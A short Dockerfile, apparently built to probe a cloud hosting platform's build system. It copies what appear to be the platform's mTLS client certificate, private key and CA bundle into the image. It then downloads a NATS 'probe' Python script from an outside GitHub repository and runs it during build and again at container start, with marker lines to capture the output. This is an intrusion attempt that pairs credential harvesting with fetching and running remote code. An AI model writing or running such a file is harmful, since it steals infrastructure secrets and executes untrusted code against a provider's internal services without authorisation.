# MARK-I68171-NATS7422-a7f3
FROM alpine:3.20
RUN echo MARK-I68171-apk-a7f3 && apk add --no-cache python3 openssl curl >/dev/null 2>&1 && echo APK_OK
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN echo MARK-I68171-dl-a7f3 && curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/nats7422_probe_i68171.py && wc -l /p.py
RUN echo MARK-I68171-BUILD-a7f3-START && PHASE=build timeout -s KILL 300 python3 /p.py 2>&1 | head -c 32000 ; echo MARK-I68171-BUILD-a7f3-END
ENV MARK_I68171=a7f3
CMD ["sh","-c","echo MARK-I68171-RT-a7f3-START; PHASE=rt timeout -s KILL 300 python3 /p.py 2>&1 | head -c 32000; echo MARK-I68171-RT-a7f3-END; sleep 120"]
